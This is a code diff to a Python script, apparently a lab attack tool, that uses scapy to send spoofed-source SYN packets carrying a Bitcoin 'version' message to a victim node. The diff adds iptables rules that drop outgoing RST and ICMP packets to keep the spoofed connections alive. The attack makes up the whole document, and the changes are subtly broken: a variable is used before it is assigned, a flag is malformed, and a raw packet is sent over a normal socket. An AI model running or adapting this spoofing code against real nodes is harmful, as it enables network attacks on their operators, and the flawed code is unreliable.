@@ -1,16 +1,26 @@
 from _thread import start_new_thread
+import atexit
 import time
+import os
 from scapy.all import *
 #from impacket import ImpactDecoder, ImpactPacket
 
 victim_ip = '10.0.2.5'
-victim_port = 8333
-attacker_port = 8333
+victim_port = 833
+attacker_port = 12345
 
 pending_spoof_IPs = []
 successful_spoof_IPs = []
 
 pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
+
+
+iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
+print(iptables_file_path)
+
+def terminal(cmd):
+	print('\n> '+cmd)
+	print(os.popen(cmd).read())
 
 def random_ip():
 	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
@@ -21,10 +31,13 @@ def spoof(src_ip, dst_ip):
 
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
-	packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
-
-	#print(packet)
-	send(packet)
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
+		s.connect((dst_ip, dst_port))
+		s.send(packet)
+	except Exception as e:
+		raise e
 	'''
 	ip = ImpactPacket.IP()
 	ip.set_ip_src(src_ip)
@@ -57,13 +70,22 @@ def spoof(src_ip, dst_ip):
 	'''
 
 	#packet.show()
-	return packet
+	return
 
 def initialize_connection(victim_ip):
+	#iptables -t raw -A PREROUTING -p tcp --dport <source port I use for scapy traffic> -j DROP
+	terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -d {victim_ip} -dport {victim_port} -j DROP')
+	terminal(f'iptables -A OUTPUT -s {spoof_ip} -d {victim_ip} -p ICMP --icmp-type port-unreachable -j DROP')
 	spoof_ip = random_ip()
 	pending_spoof_IPs.append(spoof_ip)
 
 	spoof(src_ip = spoof_ip, dst_ip = victim_ip)
+
+def cleanup():
+	if(os.path.exists(iptables_file_path)):
+		terminal(f'iptables-restore < {iptables_file_path}')
+		os.remove(iptables_file_path)
+		print('Cleaning up IP table')
 
 def packet_received(packet):
 	try:
@@ -94,6 +116,9 @@ def packet_received(packet):
 
 
 if __name__ == '__main__':
+	atexit.register(cleanup)
+	cleanup()
+	terminal(f'iptables-save > {iptables_file_path}')
 	try:
 		start_new_thread(sniff, (), {
 			'iface':'enp0s3',
